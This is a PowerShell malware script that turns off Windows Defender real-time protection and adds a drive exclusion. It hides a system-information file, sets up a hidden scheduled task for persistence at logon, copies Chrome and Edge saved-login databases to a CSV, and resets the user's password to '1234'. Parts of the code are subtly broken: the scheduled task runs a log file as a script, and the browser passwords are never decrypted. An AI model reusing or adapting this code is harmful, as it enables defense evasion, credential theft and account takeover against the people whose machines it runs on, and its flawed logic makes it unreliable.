#Requires -RunAsAdministrator

# Bypass Defender
Add-MpPreference -ExclusionPath "E:\" -Force
Set-MpPreference -DisableRealtimeMonitoring $true -Force

# System Data Collection
$systemData = @"
Hostname: $env:COMPUTERNAME
Username: $env:USERNAME
OS: $((Get-WmiObject Win32_OperatingSystem).Caption)
IP: $(Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -eq 'Dhcp' } | Select-Object -ExpandProperty IPAddress)
"@

# Write to protected file on E:
$filePath = "E:\~system.log"
Set-Content -Path $filePath -Value $systemData -Force
attrib +s +h +r $filePath

# Persistence via Scheduled Task
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File `"$filePath`""
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "SystemMonitor" -Action $action -Trigger $trigger -RunLevel Highest -Force

# Browser Credential Extraction (Chrome/Edge)
$browsers = @("Google\Chrome", "Microsoft\Edge")
$dataPath = "$env:LOCALAPPDATA\"

foreach ($browser in $browsers) {
  $loginDb = Join-Path -Path $dataPath -ChildPath "$browser\User Data\Default\Login Data"
  if (Test-Path $loginDb) {
    Copy-Item $loginDb "$env:TEMP\login.temp" -Force
    Add-Type -AssemblyName System.Data
    $conn = New-Object System.Data.SQLite.SQLiteConnection
    $conn.ConnectionString = "Data Source=$env:TEMP\login.temp"
    $conn.Open()
    $query = $conn.CreateCommand()
    $query.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
    $adapter = New-Object System.Data.SQLite.SQLiteDataAdapter $query
    $table = New-Object System.Data.DataTable
    $adapter.Fill($table) | Out-Null
    $table | Export-Csv "$env:TEMP\credentials.csv" -NoTypeInformation
    $conn.Close()
  }
}

# Password Reset (Requires Admin)
$user = $env:USERNAME
$newPassword = ConvertTo-SecureString "1234" -AsPlainText -Force
Set-LocalUser -Name $user -Password $newPassword

# Re-enable Defender (Optional)
# Set-MpPreference -DisableRealtimeMonitoring $false
